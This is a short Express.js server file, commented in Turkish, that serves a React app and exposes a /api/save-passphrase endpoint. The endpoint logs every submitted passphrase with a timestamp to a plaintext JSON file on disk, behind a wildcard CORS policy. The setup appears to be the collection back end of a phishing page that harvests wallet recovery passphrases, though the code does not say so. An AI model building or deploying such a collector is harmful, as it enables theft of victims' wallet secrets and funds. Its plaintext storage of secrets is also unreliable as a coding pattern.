const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();

// CORS ayarlarını güncelle - production için domain'i değiştireceğiz
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*'); // Production'da spesifik domain'e değiştirilecek
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  res.header('Access-Control-Allow-Credentials', 'true');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// JSON parser middleware
app.use(express.json());

// React build klasörünü statik dosyalar olarak sun
app.use(express.static(path.join(__dirname, 'build')));

// Passphrase'leri kaydetmek için endpoint
app.post('/api/save-passphrase', (req, res) => {
  const { passphrase } = req.body;
  
  // Production'da dosya sistemi yerine veritabanı kullanmak daha güvenli olur
  const dbPath = path.join(__dirname, 'passphrases.json');
  
  let passphrases = [];
  try {
    if (fs.existsSync(dbPath)) {
      const data = fs.readFileSync(dbPath, 'utf8');
      passphrases = JSON.parse(data);
    }
  } catch (error) {
    console.error('Error reading file:', error);
  }
  
  passphrases.push({
    passphrase,
    timestamp: new Date().toISOString()
  });
  
  try {
    fs.writeFileSync(dbPath, JSON.stringify(passphrases, null, 2));
    res.json({ success: true });
  } catch (error) {
    console.error('Error writing file:', error);
    res.status(500).json({ success: false, error: 'Could not save passphrase' });
  }
});

// Tüm rotaları React app'e yönlendir
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'build', 'index.html'));
});

const port = process.env.PORT || 3001;
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
}); 